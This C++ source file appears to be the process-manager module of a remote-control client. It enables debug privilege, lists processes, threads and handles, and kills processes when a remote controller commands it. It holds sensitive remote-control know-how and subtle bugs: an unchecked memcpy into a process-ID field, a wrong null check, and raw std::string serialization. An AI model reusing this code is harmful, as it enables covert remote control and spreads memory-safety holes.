#include "ProcessManager.h"


CProcessManager::CProcessManager(_CIOCPClient* IOCPClient) :CManager(IOCPClient)
{
	printf("进程管理构造函数\r\n");
	SetProcessPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	HMODULE  Kernel32ModuleBase = NULL;
	Kernel32ModuleBase = GetModuleHandleA("kernel32.dll");
	if (Kernel32ModuleBase == NULL)
	{
	}

	m_IsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(Kernel32ModuleBase, "IsWow64Process");

	if (IsWow64Process == NULL)
	{
	}
	SendClientProcessList();
}


CProcessManager::~CProcessManager()
{
	printf("进程管理析构函数\r\n");
	SetProcessPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
	m_ProcessID = NULL;
}
void  CProcessManager::HandleIO(PBYTE  BufferData, ULONG_PTR  BufferLength)
{
	BYTE  IsToken;
	switch (BufferData[0])
	{
	case  CLIENT_PROCESS_REFRESH_REQUIRE:
	{
		SendClientProcessList();
		break;
	}
	case  CLIENT_PROCESS_TERMINATE_REQUIRE:
	{
		memcpy(&m_ProcessID, BufferData+1, BufferLength);
		TerminateProcessFromId(m_ProcessID);
		SendClientProcessList();
		break;
	}
	case  CLIENT_PROCESS_THREAD_INFO_SHOW_REQUIRE:
	{
		memcpy(&m_ProcessID, BufferData + 1, BufferLength);
		SendProcessThreadInfoList(m_ProcessID);
		break;
	}
	case  CLIENT_PROCESS_HANDLE_INFO_SHOW_REQUIRE:
	{
		memcpy(&m_ProcessID, BufferData + 1, BufferLength);
		SendProcessHandleInfoList(m_ProcessID);
		break;
	}
	
	}
}
BOOL  CProcessManager::SendClientProcessList()
{
	BOOL   IsOk = FALSE;
	ULONG  EnumProcessCount = 0;
	char*  BufferData = NULL;
	DWORD  v1 = 0;
	DWORD  Offset = 1;
	vector<PROCESS_ITEM_INFORMATION>ProcessItemInfo;
	vector<PROCESS_ITEM_INFORMATION>::iterator i;
	if (m_IsWow64Process == NULL)
	{
		return IsOk;
	}
	if (SeEnumProcessByToolHelp32(ProcessItemInfo) == FALSE)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x1000);
	if (BufferData == NULL)
	{
		return IsOk;
	}
	BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY;
	//遍历模板数据
	//[CLIENT_PROCESS_MANAGER_REPLY][ProcessID][ProcessImageName\0][ProcessFullPath\0][位数\0]
	for (i = ProcessItemInfo.begin(); i != ProcessItemInfo.end(); i++)
	{
		//3代表3个\0
		v1 = sizeof(HANDLE) + lstrlen(i->ProcessImageName) + lstrlen(i->ProcessFullPath) + lstrlen(i->IsWow64) + 3;
		//若缓冲区太小，则重新分配内存
		if (LocalSize(BufferData) < (Offset + v1))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1), LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		memcpy(BufferData + Offset, &(i->ProcessID), sizeof(HANDLE));
		Offset += sizeof(HANDLE);
		memcpy(BufferData + Offset, i->ProcessImageName, lstrlen(i->ProcessImageName) + 1);
		Offset += lstrlen(i->ProcessImageName) + 1;
		memcpy(BufferData + Offset, i->ProcessFullPath, lstrlen(i->ProcessFullPath) + 1);
		Offset += lstrlen(i->ProcessFullPath) + 1;
		memcpy(BufferData + Offset, i->IsWow64, lstrlen(i->IsWow64) + 1);
		Offset += lstrlen(i->IsWow64) + 1;
	}
	m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;

	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}
BOOL  CProcessManager::SeEnumProcessByToolHelp32(vector<PROCESS_ITEM_INFORMATION>& ProcessItemInfoVector)
{

	HANDLE   SnapshotHandle = NULL;
	HANDLE   ProcessHandle = NULL;
	char     IsWow64[20] = { 0 };
	PROCESSENTRY32  ProcessEntry32;
	PROCESS_ITEM_INFORMATION    ProcessItemInfo = { 0 };
	char  ProcessFullPath[MAX_PATH] = { 0 };

	ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);

	SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (SnapshotHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	//得到第一个进程顺便判断一下系统快照是否成功
	if (Process32First(SnapshotHandle, &ProcessEntry32))
	{
		do
		{
			//打开进程并返回句柄
			ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
				FALSE, ProcessEntry32.th32ProcessID);   //打开目标进程  
														//	
			if (ProcessHandle == NULL)// 权限太高 - 降低打开
			{
				ProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
					FALSE, ProcessEntry32.th32ProcessID);   //打开目标进程

				if (ProcessHandle == NULL)
				{
					strcpy(ProcessFullPath, "打开进程失败");

					strcpy(IsWow64, "无法判断");
					goto Label;

				}

			}
			//判断目标进程的位数
			BOOL v1 = FALSE;
			if (SeIsWow64Process(ProcessHandle, &v1) == TRUE)
			{
				if (v1)
				{
					strcpy(IsWow64, "32位");
				}
				else
				{
					strcpy(IsWow64, "64位");
				}
			}
			else
			{
				strcpy(IsWow64, "无法判断");
			}

			//通过进程句柄获得第一个模块句柄信息
			HMODULE ModuleHandle = NULL;

			DWORD ReturnLength = GetModuleFileNameExA(ProcessHandle, ModuleHandle,
				ProcessFullPath,
				sizeof(ProcessFullPath));

			if (ReturnLength == 0)
			{
				//如果失败
				RtlZeroMemory(ProcessFullPath, MAX_PATH);

				QueryFullProcessImageName(ProcessHandle, 0, ProcessFullPath, &ReturnLength);	// 更推荐使用这个函数
				if (ReturnLength == 0)
				{
					strcpy(ProcessFullPath, "枚举信息失败");
				}
			}
		Label:
			ZeroMemory(&ProcessItemInfo, sizeof(ProcessItemInfo));

			ProcessItemInfo.ProcessID = (HANDLE)ProcessEntry32.th32ProcessID;
			memcpy(ProcessItemInfo.ProcessImageName, ProcessEntry32.szExeFile, strlen(ProcessEntry32.szExeFile) + 1);
			memcpy(ProcessItemInfo.ProcessFullPath, ProcessFullPath, strlen(ProcessFullPath) + 1);
			memcpy(ProcessItemInfo.IsWow64, IsWow64, strlen(IsWow64) + 1);
			ProcessItemInfoVector.push_back(ProcessItemInfo);

			if (ProcessHandle != NULL)
			{
				CloseHandle(ProcessHandle);
				ProcessHandle = NULL;
			}

		} while (Process32Next(SnapshotHandle, &ProcessEntry32));
	}
	else
	{
		CloseHandle(SnapshotHandle);

		return FALSE;
	}

	CloseHandle(SnapshotHandle);

	return ProcessItemInfoVector.size()>0 ? TRUE : FALSE;
}
BOOL  CProcessManager::SeIsWow64Process(HANDLE ProcessHandle,BOOL* IsResult)
{
	if (!SeIsValidWritePoint(IsResult))
	{
		return FALSE;
	}

	if (m_IsWow64Process != NULL)
	{
		if (!m_IsWow64Process(ProcessHandle, IsResult))
		{
			return FALSE;
		}
	}

	return TRUE;
}
BOOL  CProcessManager::SeIsValidWritePoint(LPVOID VirtualAddress)
{
#define PAGE_WRITE_FLAGS \
    (PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)
	BOOL IsOk = FALSE;
	MEMORY_BASIC_INFORMATION MemoryBasicInfo = { 0 };
	VirtualQuery(VirtualAddress, &MemoryBasicInfo, sizeof(MEMORY_BASIC_INFORMATION));

	if ((MemoryBasicInfo.State == MEM_COMMIT && (MemoryBasicInfo.Protect & PAGE_WRITE_FLAGS)))
	{
		IsOk = TRUE;
	}
	return IsOk;
}
BOOL  CProcessManager::TerminateProcessFromId(HANDLE ProcessID)
{
	BOOL bRet = FALSE;
	// 打开目标进程，取得进程句柄
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_ALL_ACCESS, FALSE, (DWORD)ProcessID);
	if (hProcess == NULL)
	{
		MessageBox(NULL, "打开进程失败", "关闭失败", NULL);
		return  bRet;
	}
	if (hProcess != NULL)
	{
		// 终止进程
		bRet = TerminateProcess(hProcess, 0);
	}
	CloseHandle(hProcess);
	return bRet;
}
BOOL  CProcessManager::SendProcessThreadInfoList(HANDLE ProcessID)
{
	HMODULE  ThreadModuleBase = NULL;
	ThreadModuleBase = LoadLibrary("__Threader.dll");
	if (ThreadModuleBase == NULL)
	{
		return FALSE;
	}
	LPFN_SEENUMTHREADINFO f1;
	f1 = (LPFN_SEENUMTHREADINFO)GetProcAddress(ThreadModuleBase, "SeEnumThreadInfo");


	BOOL   IsOk = FALSE;
	ULONG  EnumThreadCount = 0;
	char*  BufferData = NULL;
	DWORD  v1 = 0;
	DWORD  Offset = 1;
	vector<THREAD_ITEM_INFORMATION>ThreadItemInfo;
	vector<THREAD_ITEM_INFORMATION>::iterator i;
	
	if (f1(ProcessID, ThreadItemInfo) == FALSE)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x5);
	if (BufferData == NULL)
	{
		return IsOk;
	}
	BufferData[0] = CLIENT_PROCESS_THREAD_INFO_SHOW_REPLY;
	//遍历模板数据
	//[CLIENT_PROCESS_THREAD_INFO_SHOW_REPLY][ThreadID][ThreadStartAddress][Teb][Priority]
	for (i = ThreadItemInfo.begin(); i != ThreadItemInfo.end(); i++)
	{
		v1 = sizeof(HANDLE) + sizeof(PVOID) + sizeof(PVOID) + sizeof(KPRIORITY);
		//若缓冲区太小，则重新分配内存
		if (LocalSize(BufferData) < (Offset + v1))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1), LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		memcpy(BufferData + Offset, &(i->ThreadID), sizeof(HANDLE));
		Offset += sizeof(HANDLE);
		memcpy(BufferData + Offset, &(i->ThreadStartAddress), sizeof(PVOID));
		Offset += sizeof(PVOID);
		memcpy(BufferData + Offset, &(i->Teb), sizeof(PVOID));
		Offset += sizeof(PVOID);
		memcpy(BufferData + Offset, &(i->Priority), sizeof(KPRIORITY));
		Offset += sizeof(KPRIORITY);

	}
	m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;

	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}
BOOL  CProcessManager::SendProcessHandleInfoList(HANDLE ProcessID)
{
	HMODULE  ModuleBase = NULL;
	ModuleBase = LoadLibrary("__Handler.dll");
	if (ModuleBase == NULL)
	{
		return FALSE;
	}
	PFN_SEENUMHANDLEINFOBYPROCESSID f1;
	f1 = (PFN_SEENUMHANDLEINFOBYPROCESSID)GetProcAddress(ModuleBase, "SeEnumHandleInfoByProcessID");
	if (f1 == NULL)
	{
		return FALSE;
	}
	BOOL   IsOk = FALSE;
	ULONG  EnumHandleCount = 0;
	char*  BufferData = NULL;
	DWORD  v1 = 0;
	DWORD  Offset = 1;
	vector<HANDLE_ITEM_INFORMATION>HandleItemInfo;
	vector<HANDLE_ITEM_INFORMATION>::iterator i;

	if (f1(ProcessID, HandleItemInfo) == FALSE)
	{
		return IsOk;
	}
	BufferData = (char*)LocalAlloc(LPTR, 0x5);
	if (BufferData == NULL)
	{
		return IsOk;
	}
	BufferData[0] = CLIENT_PROCESS_HANDLE_INFO_SHOW_REPLY;
	//遍历模板数据
	//[CLIENT_PROCESS_THREAD_INFO_SHOW_REPLY][ThreadID][ThreadStartAddress][Teb][Priority]
	for (i = HandleItemInfo.begin(); i != HandleItemInfo.end(); i++)
	{
		v1 = sizeof(USHORT) + sizeof(PVOID) + sizeof(string) + sizeof(string);
		//若缓冲区太小，则重新分配内存
		if (LocalSize(BufferData) < (Offset + v1))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1), LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		memcpy(BufferData + Offset, &(i->HandleName), sizeof(string));
		Offset += sizeof(string);
		memcpy(BufferData + Offset, &(i->HandleType), sizeof(string));
		Offset += sizeof(string);
		memcpy(BufferData + Offset, &(i->HandleValue), sizeof(USHORT));
		Offset += sizeof(USHORT);
		memcpy(BufferData + Offset, &(i->Object), sizeof(PVOID));
		Offset += sizeof(PVOID);

	}
	m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;

	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;
}
